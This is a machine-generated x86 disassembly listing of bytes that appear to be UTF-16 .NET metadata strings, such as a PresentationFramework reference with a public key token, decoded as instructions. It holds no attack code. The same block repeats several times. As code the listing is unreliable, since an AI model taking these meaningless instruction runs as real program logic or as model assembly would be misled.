  403aaa:	xor    BYTE PTR [eax],al
  403aac:	xor    BYTE PTR [eax],al
  403aae:	xor    BYTE PTR [eax],al
  403ab0:	xor    BYTE PTR [eax],al
  403ab2:	xor    eax,0x35003200
  403ab7:	add    BYTE PTR [ebx],dh
  403ab9:	add    BYTE PTR [eax+eax*1],dh
  403abc:	xor    DWORD PTR [eax],eax
  403abe:	xor    eax,DWORD PTR [eax]
  403ac0:	xor    DWORD PTR [eax],eax
  403ac2:	xor    BYTE PTR [eax],al
  403ac4:	xor    BYTE PTR [eax],al
  403ac6:	xor    BYTE PTR [eax],al
  403ac8:	xor    al,0x0
  403aca:	xor    BYTE PTR [eax],al
  403acc:	xor    BYTE PTR [eax],al
  403ace:	xor    BYTE PTR [eax],al
  403ad0:	xor    BYTE PTR [eax],al
  403ad2:	xor    BYTE PTR [eax],al
  403ad4:	xor    DWORD PTR [eax],eax
  403ad6:	xor    BYTE PTR [eax],al
  403ad8:	xor    BYTE PTR [eax],al
  403ada:	xor    BYTE PTR [eax],al
  403adc:	xor    DWORD PTR [eax],eax
  403ade:	xor    BYTE PTR [eax],al
  403ae0:	xor    BYTE PTR [eax],al
  403ae2:	bound  eax,QWORD PTR [eax]
  403ae4:	xor    eax,0x63006600
  403ae9:	add    BYTE PTR [ecx],bh
  403aeb:	add    BYTE PTR [eax],dh
  403aed:	add    BYTE PTR [ebp+0x0],ah
  403af0:	aaa    
  403af1:	add    BYTE PTR [eax],dh
  403af3:	add    BYTE PTR [edx],dh
  403af5:	add    BYTE PTR [edi],dh
  403af7:	add    BYTE PTR [esi+0x0],ah
  403afa:	add    BYTE PTR ss:[edi],dh
  403afd:	add    BYTE PTR [eax],bh
  403aff:	add    BYTE PTR [edi],dh
  403b01:	add    BYTE PTR [ecx],dh
  403b03:	add    BYTE PTR [ebp+0x0],ah
  403b06:	aaa    
  403b07:	add    BYTE PTR [edi],dh
  403b09:	add    BYTE PTR [ebx],dh
  403b0b:	add    BYTE PTR [ecx+0x0],ah
  403b0e:	cmp    BYTE PTR [eax],al
  403b10:	data16 add BYTE PTR [eax+eax*1+0x65],ah
  403b15:	add    BYTE PTR [eax],bh
  403b17:	add    BYTE PTR [ecx],bh
  403b19:	add    BYTE PTR [ebx],dh
  403b1b:	add    BYTE PTR [eax],bh
  403b1d:	add    BYTE PTR [ebx+0x0],ah
  403b20:	cmp    BYTE PTR [eax],al
  403b22:	xor    DWORD PTR [eax],eax
  403b24:	add    BYTE PTR fs:[eax+eax*1+0x34],ah
  403b29:	add    BYTE PTR [eax],dh
  403b2b:	add    BYTE PTR [edx],dh
  403b2d:	add    BYTE PTR [edx+0x0],ah
  403b30:	popa   
  403b31:	add    BYTE PTR [esi],dh
  403b33:	add    BYTE PTR ds:0x39006200,dh
  403b39:	add    BYTE PTR [edx],dh
  403b3b:	add    BYTE PTR [eax],dh
  403b3d:	add    BYTE PTR [ecx],dh
  403b3f:	add    BYTE PTR [eax+eax*1+0x36],ah
  403b43:	add    BYTE PTR [eax],dh
  403b45:	add    BYTE PTR ds:0x33003900,dh
  403b4b:	add    BYTE PTR [ebp+0x0],ah
  403b4e:	cmp    DWORD PTR [eax],eax
  403b50:	add    BYTE PTR ss:[ebx+0x0],ah
  403b54:	xor    al,0x0
  403b56:	cmp    DWORD PTR [eax],eax
  403b58:	xor    al,BYTE PTR [eax]
  403b5a:	add    BYTE PTR ss:0x65003100,dh
  403b61:	add    BYTE PTR [eax],bh
  403b63:	add    BYTE PTR [eax],bh
  403b65:	add    BYTE PTR [ecx],bh
  403b67:	add    BYTE PTR [ebx+0x0],ah
  403b6a:	arpl   WORD PTR [eax],ax
  403b6c:	xor    DWORD PTR [eax],eax
  403b6e:	xor    eax,DWORD PTR [eax]
  403b70:	data16 add BYTE PTR [ecx],dh
  403b73:	add    BYTE PTR [eax+eax*1],dh
  403b76:	xor    DWORD PTR [eax],eax
  403b78:	xor    eax,0x62006500
  403b7d:	add    BYTE PTR [edx+0x0],ah
  403b80:	xor    eax,0x66003300
  403b85:	add    BYTE PTR [ecx+0x0],ah
  403b88:	arpl   WORD PTR [eax],ax
  403b8a:	xor    DWORD PTR [eax],eax
  403b8c:	xor    DWORD PTR [eax],eax
  403b8e:	xor    eax,DWORD PTR [eax]
  403b90:	xor    DWORD PTR [eax],eax
  403b92:	popa   
  403b93:	add    BYTE PTR [ebp+0x0],ah
  403b96:	xor    BYTE PTR [eax],al
  403b98:	bound  eax,QWORD PTR [eax]
  403b9a:	add    BYTE PTR fs:[ebx],dh
  403b9d:	add    BYTE PTR [ebx],dh
  403b9f:	add    BYTE PTR [ebx],dh
  403ba1:	add    BYTE PTR [ebx+0x0],ah
  403ba4:	xor    eax,0x65006500
  403ba9:	add    BYTE PTR [esi],dh
  403bab:	add    BYTE PTR [eax],dh
  403bad:	add    BYTE PTR [edx],dh
  403baf:	add    BYTE PTR [ecx],dh
  403bb1:	add    BYTE PTR [esi],dh
  403bb3:	add    BYTE PTR [edi],dh
  403bb5:	add    BYTE PTR [edx],dh
  403bb7:	add    BYTE PTR [eax+eax*1+0x39],ah
  403bbb:	add    BYTE PTR [edi],dh
  403bbd:	add    BYTE PTR [ecx],dh
  403bbf:	add    BYTE PTR [eax],bh
  403bc1:	add    BYTE PTR [ebp+0x0],ah
  403bc4:	popa   
  403bc5:	add    BYTE PTR [ebx],dh
  403bc7:	add    BYTE PTR [ecx],dh
  403bc9:	add    BYTE PTR [ecx+0x0],ah
  403bcc:	cmp    BYTE PTR [eax],al
  403bce:	popa   
  403bcf:	add    BYTE PTR [ebp+0x0],ah
  403bd2:	bound  eax,QWORD PTR [eax]
  403bd4:	add    BYTE PTR fs:[eax],dh
  403bd7:	add    BYTE PTR [eax+eax*1+0x61],ah
  403bdb:	add    BYTE PTR [eax],dh
  403bdd:	add    BYTE PTR [eax],dh
  403bdf:	add    BYTE PTR [edi],dh
  403be1:	add    BYTE PTR [edx],dh
  403be3:	add    BYTE PTR [esi+0x0],ah
  403be6:	xor    al,BYTE PTR [eax]
  403be8:	xor    eax,0x38006400
  403bed:	add    BYTE PTR [edi],dh
  403bef:	add    BYTE PTR [eax+eax*1+0x62],ah
  403bf3:	add    BYTE PTR [ecx+0x0],ah
  403bf6:	add    BYTE PTR ss:[esi+0x0],ah
  403bfa:	arpl   WORD PTR [eax],ax
  403bfc:	cmp    DWORD PTR [eax],eax
  403bfe:	xor    BYTE PTR [eax],al
  403c00:	data16 add BYTE PTR [esi+0x0],ah
  403c04:	add    BYTE PTR fs:0x38003900,dh
  403c0b:	add    BYTE PTR [ebp+0x0],ah
  403c0e:	add    BYTE PTR fs:[eax+eax*1],dh
  403c12:	add    BYTE PTR fs:[ecx+0x0],ah
  403c16:	xor    eax,DWORD PTR [eax]
  403c18:	xor    eax,0x34006500
  403c1d:	add    BYTE PTR [eax+eax*1],dh
  403c20:	arpl   WORD PTR [eax],ax
  403c22:	xor    eax,DWORD PTR [eax]
  403c24:	cmp    DWORD PTR [eax],eax
  403c26:	cmp    BYTE PTR [eax],al
  403c28:	arpl   WORD PTR [eax],ax
  403c2a:	xor    al,0x0
  403c2c:	xor    eax,0x33003400
  403c31:	add    BYTE PTR [eax],dh
  403c33:	add    BYTE PTR [edi],dh
  403c35:	add    BYTE PTR [ebp+0x0],ah
  403c38:	cmp    BYTE PTR [eax],al
  403c3a:	add    BYTE PTR gs:[ebx],dh
  403c3d:	add    BYTE PTR [ebx],dh
  403c3f:	add    BYTE PTR [edx+0x0],ah
  403c42:	cmp    BYTE PTR [eax],al
  403c44:	xor    al,0x0
  403c46:	xor    al,BYTE PTR [eax]
  403c48:	add    BYTE PTR ss:[ecx],dh
  403c4b:	add    BYTE PTR [eax+eax*1],dh
  403c4e:	xor    eax,DWORD PTR [eax]
  403c50:	add    BYTE PTR fs:[ecx+0x0],ah
  403c54:	add    BYTE PTR gs:[ebx+0x0],ah
  403c58:	cmp    DWORD PTR [eax],eax
  403c5a:	data16 add BYTE PTR ds:0x36003900,dh
  403c61:	add    BYTE PTR [eax],bh
  403c63:	add    BYTE PTR [ebx],dh
  403c65:	add    BYTE PTR [esi],dh
  403c67:	add    BYTE PTR [esi+0x0],ah
  403c6a:	cmp    DWORD PTR [eax],eax
  403c6c:	aaa    
  403c6d:	add    BYTE PTR [ebx+0x0],ah
  403c70:	cmp    BYTE PTR [eax],al
  403c72:	data16 add BYTE PTR [edi],dh
  403c75:	add    BYTE PTR [eax+eax*1],dh
  403c78:	aaa    
  403c79:	add    BYTE PTR ds:0x65003000,dh
  403c7f:	add    BYTE PTR ds:0x37003900,dh
  403c85:	add    BYTE PTR ds:0x36006300,dh
  403c8b:	add    BYTE PTR [eax+eax*1],dh
  403c8e:	add    BYTE PTR gs:[edx],dh
  403c91:	add    BYTE PTR [ecx],dh
  403c93:	add    BYTE PTR [eax],bh
  403c95:	add    BYTE PTR [ecx],bh
  403c97:	add    BYTE PTR [esi+0x0],ah
  403c9a:	xor    al,0x0
  403c9c:	xor    eax,0x65006400
  403ca1:	add    BYTE PTR [esi+0x0],ah
  403ca4:	xor    al,0x0
  403ca6:	add    BYTE PTR ss:[edx+0x0],ah
  403caa:	xor    al,BYTE PTR [eax]
  403cac:	popa   
  403cad:	add    BYTE PTR [edx],dh
  403caf:	add    BYTE PTR [edx+0x0],ah
  403cb2:	xor    DWORD PTR [eax],eax
  403cb4:	xor    al,BYTE PTR [eax]
  403cb6:	xor    al,0x0
  403cb8:	aaa    
  403cb9:	add    BYTE PTR [ecx+0x0],ah
  403cbc:	add    BYTE PTR fs:[ebx+0x0],ah
  403cc0:	xor    eax,DWORD PTR [eax]
  403cc2:	add    BYTE PTR ss:0x62003200,dh
  403cc9:	add    BYTE PTR [esi+0x0],ah
  403ccc:	xor    eax,0x33006300
  403cd1:	add    BYTE PTR [eax],dh
  403cd3:	add    BYTE PTR [eax],bh
  403cd5:	add    BYTE PTR [eax],dh
  403cd7:	add    BYTE PTR ds:0x64003500,dh
  403cdd:	add    BYTE PTR [ecx+0x0],ah
  403ce0:	cmp    DWORD PTR [eax],eax
  403ce2:	add    dl,0x50
  403ce5:	add    BYTE PTR [edx+0x0],dh
  403ce8:	add    BYTE PTR gs:[ebx+0x0],dh
  403cec:	add    BYTE PTR gs:[esi+0x0],ch
  403cf0:	je     0x403cf2
  403cf2:	popa   
  403cf3:	add    BYTE PTR [eax+eax*1+0x69],dh
  403cf7:	add    BYTE PTR [edi+0x0],ch
  403cfa:	outs   dx,BYTE PTR ds:[esi]
  403cfb:	add    BYTE PTR [esi+0x0],al
  403cfe:	outs   dx,DWORD PTR ds:[esi]
  403cff:	add    BYTE PTR [esi+0x0],ch
  403d02:	je     0x403d04
  403d04:	inc    ebx
  403d05:	add    BYTE PTR [ecx+0x0],ah
  403d08:	arpl   WORD PTR [eax],ax
  403d0a:	push   0x2c006500
  403d0f:	add    BYTE PTR [eax],ah
  403d11:	add    BYTE PTR [eax+0x0],dl
  403d14:	jne    0x403d16
  403d16:	bound  eax,QWORD PTR [eax]
  403d18:	ins    BYTE PTR es:[edi],dx
  403d19:	add    BYTE PTR [ecx+0x0],ch
  403d1c:	arpl   WORD PTR [eax],ax
  403d1e:	dec    ebx
  403d1f:	add    BYTE PTR [ebp+0x0],ah
  403d22:	jns    0x403d24
  403d24:	cmp    eax,0x30003000
  403d29:	add    BYTE PTR [edx],dh
  403d2b:	add    BYTE PTR [eax+eax*1],dh
  403d2e:	xor    BYTE PTR [eax],al
  403d30:	xor    BYTE PTR [eax],al
  403d32:	xor    BYTE PTR [eax],al
  403d34:	xor    BYTE PTR [eax],al
  403d36:	xor    BYTE PTR [eax],al
  403d38:	xor    al,0x0
  403d3a:	cmp    BYTE PTR [eax],al
  403d3c:	xor    BYTE PTR [eax],al
  403d3e:	xor    BYTE PTR [eax],al
  403d40:	xor    BYTE PTR [eax],al
  403d42:	xor    BYTE PTR [eax],al
  403d44:	xor    BYTE PTR [eax],al
  403d46:	cmp    DWORD PTR [eax],eax
  403d48:	xor    al,0x0
  403d4a:	xor    BYTE PTR [eax],al
  403d4c:	xor    BYTE PTR [eax],al
  403d4e:	xor    BYTE PTR [eax],al
  403d50:	xor    BYTE PTR [eax],al
  403d52:	xor    BYTE PTR [eax],al
  403d54:	xor    BYTE PTR [eax],al
  403d56:	xor    BYTE PTR [eax],al
  403d58:	add    BYTE PTR ss:[eax],dh
  403d5b:	add    BYTE PTR [edx],dh
  403d5d:	add    BYTE PTR [eax],dh
  403d5f:	add    BYTE PTR [eax],dh
  403d61:	add    BYTE PTR [eax],dh
  403d63:	add    BYTE PTR [eax],dh
  403d65:	add    BYTE PTR [eax],dh
  403d67:	add    BYTE PTR [eax],dh
  403d69:	add    BYTE PTR [edx],dh
  403d6b:	add    BYTE PTR [eax+eax*1],dh
  403d6e:	xor    BYTE PTR [eax],al
  403d70:	xor    BYTE PTR [eax],al
  403d72:	xor    BYTE PTR [eax],al
  403d74:	xor    BYTE PTR [eax],al
  403d76:	xor    eax,0x35003200
  403d7b:	add    BYTE PTR [ebx],dh
  403d7d:	add    BYTE PTR [eax+eax*1],dh
  403d80:	xor    DWORD PTR [eax],eax
  403d82:	xor    eax,DWORD PTR [eax]
  403d84:	xor    DWORD PTR [eax],eax
  403d86:	xor    BYTE PTR [eax],al
  403d88:	xor    BYTE PTR [eax],al
  403d8a:	xor    BYTE PTR [eax],al
  403d8c:	xor    al,0x0
  403d8e:	xor    BYTE PTR [eax],al
  403d90:	xor    BYTE PTR [eax],al
  403d92:	xor    BYTE PTR [eax],al
  403d94:	xor    BYTE PTR [eax],al
  403d96:	xor    BYTE PTR [eax],al
  403d98:	xor    DWORD PTR [eax],eax
  403d9a:	xor    BYTE PTR [eax],al
  403d9c:	xor    BYTE PTR [eax],al
  403d9e:	xor    BYTE PTR [eax],al
  403da0:	xor    DWORD PTR [eax],eax
  403da2:	xor    BYTE PTR [eax],al
  403da4:	xor    BYTE PTR [eax],al
  403da6:	bound  eax,QWORD PTR [eax]
  403da8:	xor    eax,0x63006600
  403dad:	add    BYTE PTR [ecx],bh
  403daf:	add    BYTE PTR [eax],dh
  403db1:	add    BYTE PTR [ebp+0x0],ah
  403db4:	aaa    
  403db5:	add    BYTE PTR [eax],dh
  403db7:	add    BYTE PTR [edx],dh
  403db9:	add    BYTE PTR [edi],dh
  403dbb:	add    BYTE PTR [esi+0x0],ah
  403dbe:	add    BYTE PTR ss:[edi],dh
  403dc1:	add    BYTE PTR [eax],bh
  403dc3:	add    BYTE PTR [edi],dh
  403dc5:	add    BYTE PTR [ecx],dh
  403dc7:	add    BYTE PTR [ebp+0x0],ah
  403dca:	aaa    
  403dcb:	add    BYTE PTR [edi],dh
  403dcd:	add    BYTE PTR [ebx],dh
  403dcf:	add    BYTE PTR [ecx+0x0],ah
  403dd2:	cmp    BYTE PTR [eax],al
  403dd4:	data16 add BYTE PTR [eax+eax*1+0x65],ah
  403dd9:	add    BYTE PTR [eax],bh
  403ddb:	add    BYTE PTR [ecx],bh
  403ddd:	add    BYTE PTR [ebx],dh
  403ddf:	add    BYTE PTR [eax],bh
  403de1:	add    BYTE PTR [ebx+0x0],ah
  403de4:	cmp    BYTE PTR [eax],al
  403de6:	xor    DWORD PTR [eax],eax
  403de8:	add    BYTE PTR fs:[eax+eax*1+0x34],ah
  403ded:	add    BYTE PTR [eax],dh
  403def:	add    BYTE PTR [edx],dh
  403df1:	add    BYTE PTR [edx+0x0],ah
  403df4:	popa   
  403df5:	add    BYTE PTR [esi],dh
  403df7:	add    BYTE PTR ds:0x39006200,dh
  403dfd:	add    BYTE PTR [edx],dh
  403dff:	add    BYTE PTR [eax],dh
  403e01:	add    BYTE PTR [ecx],dh
  403e03:	add    BYTE PTR [eax+eax*1+0x36],ah
  403e07:	add    BYTE PTR [eax],dh
  403e09:	add    BYTE PTR ds:0x33003900,dh
  403e0f:	add    BYTE PTR [ebp+0x0],ah
  403e12:	cmp    DWORD PTR [eax],eax
  403e14:	add    BYTE PTR ss:[ebx+0x0],ah
  403e18:	xor    al,0x0
  403e1a:	cmp    DWORD PTR [eax],eax
  403e1c:	xor    al,BYTE PTR [eax]
  403e1e:	add    BYTE PTR ss:0x65003100,dh
  403e25:	add    BYTE PTR [eax],bh
  403e27:	add    BYTE PTR [eax],bh
  403e29:	add    BYTE PTR [ecx],bh
  403e2b:	add    BYTE PTR [ebx+0x0],ah
  403e2e:	arpl   WORD PTR [eax],ax
  403e30:	xor    DWORD PTR [eax],eax
  403e32:	xor    eax,DWORD PTR [eax]
  403e34:	data16 add BYTE PTR [ecx],dh
  403e37:	add    BYTE PTR [eax+eax*1],dh
  403e3a:	xor    DWORD PTR [eax],eax
  403e3c:	xor    eax,0x62006500
  403e41:	add    BYTE PTR [edx+0x0],ah
  403e44:	xor    eax,0x66003300
  403e49:	add    BYTE PTR [ecx+0x0],ah
  403e4c:	arpl   WORD PTR [eax],ax
  403e4e:	xor    DWORD PTR [eax],eax
  403e50:	xor    DWORD PTR [eax],eax
  403e52:	xor    eax,DWORD PTR [eax]
  403e54:	xor    DWORD PTR [eax],eax
  403e56:	popa   
  403e57:	add    BYTE PTR [ebp+0x0],ah
  403e5a:	xor    BYTE PTR [eax],al
  403e5c:	bound  eax,QWORD PTR [eax]
  403e5e:	add    BYTE PTR fs:[ebx],dh
  403e61:	add    BYTE PTR [ebx],dh
  403e63:	add    BYTE PTR [ebx],dh
  403e65:	add    BYTE PTR [ebx+0x0],ah
  403e68:	xor    eax,0x65006500
  403e6d:	add    BYTE PTR [esi],dh
  403e6f:	add    BYTE PTR [eax],dh
  403e71:	add    BYTE PTR [edx],dh
  403e73:	add    BYTE PTR [ecx],dh
  403e75:	add    BYTE PTR [esi],dh
  403e77:	add    BYTE PTR [edi],dh
  403e79:	add    BYTE PTR [edx],dh
  403e7b:	add    BYTE PTR [eax+eax*1+0x39],ah
  403e7f:	add    BYTE PTR [edi],dh
  403e81:	add    BYTE PTR [ecx],dh
  403e83:	add    BYTE PTR [eax],bh
  403e85:	add    BYTE PTR [ebp+0x0],ah
  403e88:	popa   
  403e89:	add    BYTE PTR [ebx],dh
  403e8b:	add    BYTE PTR [ecx],dh
  403e8d:	add    BYTE PTR [ecx+0x0],ah
  403e90:	cmp    BYTE PTR [eax],al
  403e92:	popa   
  403e93:	add    BYTE PTR [ebp+0x0],ah
  403e96:	bound  eax,QWORD PTR [eax]
  403e98:	add    BYTE PTR fs:[eax],dh
  403e9b:	add    BYTE PTR [eax+eax*1+0x61],ah
  403e9f:	add    BYTE PTR [eax],dh
  403ea1:	add    BYTE PTR [eax],dh
  403ea3:	add    BYTE PTR [edi],dh
  403ea5:	add    BYTE PTR [edx],dh
  403ea7:	add    BYTE PTR [esi+0x0],ah
  403eaa:	xor    al,BYTE PTR [eax]
  403eac:	xor    eax,0x38006400
  403eb1:	add    BYTE PTR [edi],dh
  403eb3:	add    BYTE PTR [eax+eax*1+0x62],ah
  403eb7:	add    BYTE PTR [ecx+0x0],ah
  403eba:	add    BYTE PTR ss:[esi+0x0],ah
  403ebe:	arpl   WORD PTR [eax],ax
  403ec0:	cmp    DWORD PTR [eax],eax
  403ec2:	xor    BYTE PTR [eax],al
  403ec4:	data16 add BYTE PTR [esi+0x0],ah
  403ec8:	add    BYTE PTR fs:0x38003900,dh
  403ecf:	add    BYTE PTR [ebp+0x0],ah
  403ed2:	add    BYTE PTR fs:[eax+eax*1],dh
  403ed6:	add    BYTE PTR fs:[ecx+0x0],ah
  403eda:	xor    eax,DWORD PTR [eax]
  403edc:	xor    eax,0x34006500
  403ee1:	add    BYTE PTR [eax+eax*1],dh
  403ee4:	arpl   WORD PTR [eax],ax
  403ee6:	xor    eax,DWORD PTR [eax]
  403ee8:	cmp    DWORD PTR [eax],eax
  403eea:	cmp    BYTE PTR [eax],al
  403eec:	arpl   WORD PTR [eax],ax
  403eee:	xor    al,0x0
  403ef0:	xor    eax,0x33003400
  403ef5:	add    BYTE PTR [eax],dh
  403ef7:	add    BYTE PTR [edi],dh
  403ef9:	add    BYTE PTR [ebp+0x0],ah
  403efc:	cmp    BYTE PTR [eax],al
  403efe:	add    BYTE PTR gs:[ebx],dh
  403f01:	add    BYTE PTR [ebx],dh
  403f03:	add    BYTE PTR [edx+0x0],ah
  403f06:	cmp    BYTE PTR [eax],al
  403f08:	xor    al,0x0
  403f0a:	xor    al,BYTE PTR [eax]
  403f0c:	add    BYTE PTR ss:[ecx],dh
  403f0f:	add    BYTE PTR [eax+eax*1],dh
  403f12:	xor    eax,DWORD PTR [eax]
  403f14:	add    BYTE PTR fs:[ecx+0x0],ah
  403f18:	add    BYTE PTR gs:[ebx+0x0],ah
  403f1c:	cmp    DWORD PTR [eax],eax
  403f1e:	data16 add BYTE PTR ds:0x36003900,dh
  403f25:	add    BYTE PTR [eax],bh
  403f27:	add    BYTE PTR [ebx],dh
  403f29:	add    BYTE PTR [esi],dh
  403f2b:	add    BYTE PTR [esi+0x0],ah
  403f2e:	cmp    DWORD PTR [eax],eax
  403f30:	aaa    
  403f31:	add    BYTE PTR [ebx+0x0],ah
  403f34:	cmp    BYTE PTR [eax],al
  403f36:	data16 add BYTE PTR [edi],dh
  403f39:	add    BYTE PTR [eax+eax*1],dh
  403f3c:	aaa    
  403f3d:	add    BYTE PTR ds:0x65003000,dh
  403f43:	add    BYTE PTR ds:0x37003900,dh
  403f49:	add    BYTE PTR ds:0x36006300,dh
  403f4f:	add    BYTE PTR [eax+eax*1],dh
  403f52:	add    BYTE PTR gs:[edx],dh
  403f55:	add    BYTE PTR [ecx],dh
  403f57:	add    BYTE PTR [eax],bh
  403f59:	add    BYTE PTR [ecx],bh
  403f5b:	add    BYTE PTR [esi+0x0],ah
  403f5e:	xor    al,0x0
  403f60:	xor    eax,0x65006400
  403f65:	add    BYTE PTR [esi+0x0],ah
  403f68:	xor    al,0x0
  403f6a:	add    BYTE PTR ss:[edx+0x0],ah
  403f6e:	xor    al,BYTE PTR [eax]
  403f70:	popa   
  403f71:	add    BYTE PTR [edx],dh
  403f73:	add    BYTE PTR [edx+0x0],ah
  403f76:	xor    DWORD PTR [eax],eax
  403f78:	xor    al,BYTE PTR [eax]
  403f7a:	xor    al,0x0
  403f7c:	aaa    
  403f7d:	add    BYTE PTR [ecx+0x0],ah
  403f80:	add    BYTE PTR fs:[ebx+0x0],ah
  403f84:	xor    eax,DWORD PTR [eax]
  403f86:	add    BYTE PTR ss:0x62003200,dh
  403f8d:	add    BYTE PTR [esi+0x0],ah
  403f90:	xor    eax,0x33006300
  403f95:	add    BYTE PTR [eax],dh
  403f97:	add    BYTE PTR [eax],bh
  403f99:	add    BYTE PTR [eax],dh
  403f9b:	add    BYTE PTR ds:0x64003500,dh
  403fa1:	add    BYTE PTR [ecx+0x0],ah
  403fa4:	cmp    DWORD PTR [eax],eax
  403fa6:	add    dl,0x50
  403fa9:	add    BYTE PTR [edx+0x0],dh
  403fac:	add    BYTE PTR gs:[ebx+0x0],dh
  403fb0:	add    BYTE PTR gs:[esi+0x0],ch
  403fb4:	je     0x403fb6
  403fb6:	popa   
  403fb7:	add    BYTE PTR [eax+eax*1+0x69],dh
  403fbb:	add    BYTE PTR [edi+0x0],ch
  403fbe:	outs   dx,BYTE PTR ds:[esi]
  403fbf:	add    BYTE PTR [esi+0x0],al
  403fc2:	jb     0x403fc4
  403fc4:	popa   
  403fc5:	add    BYTE PTR [ebp+0x0],ch
  403fc8:	add    BYTE PTR gs:[edi+0x0],dh
  403fcc:	outs   dx,DWORD PTR ds:[esi]
  403fcd:	add    BYTE PTR [edx+0x0],dh
  403fd0:	imul   eax,DWORD PTR [eax],0x2c
  403fd3:	add    BYTE PTR [eax],ah
  403fd5:	add    BYTE PTR [eax+0x0],dl
  403fd8:	jne    0x403fda
  403fda:	bound  eax,QWORD PTR [eax]
  403fdc:	ins    BYTE PTR es:[edi],dx
  403fdd:	add    BYTE PTR [ecx+0x0],ch
  403fe0:	arpl   WORD PTR [eax],ax
  403fe2:	dec    ebx
  403fe3:	add    BYTE PTR [ebp+0x0],ah
  403fe6:	jns    0x403fe8
  403fe8:	cmp    eax,0x30003000
  403fed:	add    BYTE PTR [edx],dh
  403fef:	add    BYTE PTR [eax+eax*1],dh
  403ff2:	xor    BYTE PTR [eax],al
  403ff4:	xor    BYTE PTR [eax],al
  403ff6:	xor    BYTE PTR [eax],al
  403ff8:	xor    BYTE PTR [eax],al
  403ffa:	xor    BYTE PTR [eax],al
  403ffc:	xor    al,0x0
  403ffe:	cmp    BYTE PTR [eax],al
  404000:	xor    BYTE PTR [eax],al
  404002:	xor    BYTE PTR [eax],al
  404004:	xor    BYTE PTR [eax],al
  404006:	xor    BYTE PTR [eax],al
  404008:	xor    BYTE PTR [eax],al
  40400a:	cmp    DWORD PTR [eax],eax
  40400c:	xor    al,0x0
  40400e:	xor    BYTE PTR [eax],al
  404010:	xor    BYTE PTR [eax],al
  404012:	xor    BYTE PTR [eax],al
  404014:	xor    BYTE PTR [eax],al
  404016:	xor    BYTE PTR [eax],al
  404018:	xor    BYTE PTR [eax],al
  40401a:	xor    BYTE PTR [eax],al
  40401c:	add    BYTE PTR ss:[eax],dh
  40401f:	add    BYTE PTR [edx],dh
  404021:	add    BYTE PTR [eax],dh
  404023:	add    BYTE PTR [eax],dh
  404025:	add    BYTE PTR [eax],dh
  404027:	add    BYTE PTR [eax],dh
  404029:	add    BYTE PTR [eax],dh
  40402b:	add    BYTE PTR [eax],dh
  40402d:	add    BYTE PTR [edx],dh
  40402f:	add    BYTE PTR [eax+eax*1],dh
  404032:	xor    BYTE PTR [eax],al
  404034:	xor    BYTE PTR [eax],al
  404036:	xor    BYTE PTR [eax],al
  404038:	xor    BYTE PTR [eax],al
  40403a:	xor    eax,0x35003200
  40403f:	add    BYTE PTR [ebx],dh
  404041:	add    BYTE PTR [eax+eax*1],dh
  404044:	xor    DWORD PTR [eax],eax
  404046:	xor    eax,DWORD PTR [eax]
  404048:	xor    DWORD PTR [eax],eax
  40404a:	xor    BYTE PTR [eax],al
  40404c:	xor    BYTE PTR [eax],al
  40404e:	xor    BYTE PTR [eax],al
  404050:	xor    al,0x0
  404052:	xor    BYTE PTR [eax],al
  404054:	xor    BYTE PTR [eax],al
  404056:	xor    BYTE PTR [eax],al
  404058:	xor    BYTE PTR [eax],al
  40405a:	xor    BYTE PTR [eax],al
  40405c:	xor    DWORD PTR [eax],eax
  40405e:	xor    BYTE PTR [eax],al
  404060:	xor    BYTE PTR [eax],al
  404062:	xor    BYTE PTR [eax],al
  404064:	xor    DWORD PTR [eax],eax
  404066:	xor    BYTE PTR [eax],al
  404068:	xor    BYTE PTR [eax],al
  40406a:	bound  eax,QWORD PTR [eax]
  40406c:	xor    eax,0x63006600
  404071:	add    BYTE PTR [ecx],bh
  404073:	add    BYTE PTR [eax],dh
  404075:	add    BYTE PTR [ebp+0x0],ah
  404078:	aaa    
  404079:	add    BYTE PTR [eax],dh
  40407b:	add    BYTE PTR [edx],dh
  40407d:	add    BYTE PTR [edi],dh
  40407f:	add    BYTE PTR [esi+0x0],ah
  404082:	add    BYTE PTR ss:[edi],dh
  404085:	add    BYTE PTR [eax],bh
  404087:	add    BYTE PTR [edi],dh
  404089:	add    BYTE PTR [ecx],dh
  40408b:	add    BYTE PTR [ebp+0x0],ah
  40408e:	aaa    
  40408f:	add    BYTE PTR [edi],dh
  404091:	add    BYTE PTR [ebx],dh
  404093:	add    BYTE PTR [ecx+0x0],ah
  404096:	cmp    BYTE PTR [eax],al
  404098:	data16 add BYTE PTR [eax+eax*1+0x65],ah
  40409d:	add    BYTE PTR [eax],bh
  40409f:	add    BYTE PTR [ecx],bh
  4040a1:	add    BYTE PTR [ebx],dh
  4040a3:	add    BYTE PTR [eax],bh
  4040a5:	add    BYTE PTR [ebx+0x0],ah
  4040a8:	cmp    BYTE PTR [eax],al
  4040aa:	xor    DWORD PTR [eax],eax
  4040ac:	add    BYTE PTR fs:[eax+eax*1+0x34],ah
  4040b1:	add    BYTE PTR [eax],dh
  4040b3:	add    BYTE PTR [edx],dh
  4040b5:	add    BYTE PTR [edx+0x0],ah
  4040b8:	popa   
  4040b9:	add    BYTE PTR [esi],dh
  4040bb:	add    BYTE PTR ds:0x39006200,dh
  4040c1:	add    BYTE PTR [edx],dh
  4040c3:	add    BYTE PTR [eax],dh
  4040c5:	add    BYTE PTR [ecx],dh
  4040c7:	add    BYTE PTR [eax+eax*1+0x36],ah
  4040cb:	add    BYTE PTR [eax],dh
  4040cd:	add    BYTE PTR ds:0x33003900,dh
  4040d3:	add    BYTE PTR [ebp+0x0],ah
  4040d6:	cmp    DWORD PTR [eax],eax
  4040d8:	add    BYTE PTR ss:[ebx+0x0],ah
  4040dc:	xor    al,0x0
  4040de:	cmp    DWORD PTR [eax],eax
  4040e0:	xor    al,BYTE PTR [eax]
  4040e2:	add    BYTE PTR ss:0x65003100,dh
  4040e9:	add    BYTE PTR [eax],bh
  4040eb:	add    BYTE PTR [eax],bh
  4040ed:	add    BYTE PTR [ecx],bh
  4040ef:	add    BYTE PTR [ebx+0x0],ah
  4040f2:	arpl   WORD PTR [eax],ax
  4040f4:	xor    DWORD PTR [eax],eax
  4040f6:	xor    eax,DWORD PTR [eax]
  4040f8:	data16 add BYTE PTR [ecx],dh
  4040fb:	add    BYTE PTR [eax+eax*1],dh
  4040fe:	xor    DWORD PTR [eax],eax
  404100:	xor    eax,0x62006500
  404105:	add    BYTE PTR [edx+0x0],ah
  404108:	xor    eax,0x66003300
  40410d:	add    BYTE PTR [ecx+0x0],ah
  404110:	arpl   WORD PTR [eax],ax
  404112:	xor    DWORD PTR [eax],eax
  404114:	xor    DWORD PTR [eax],eax
  404116:	xor    eax,DWORD PTR [eax]
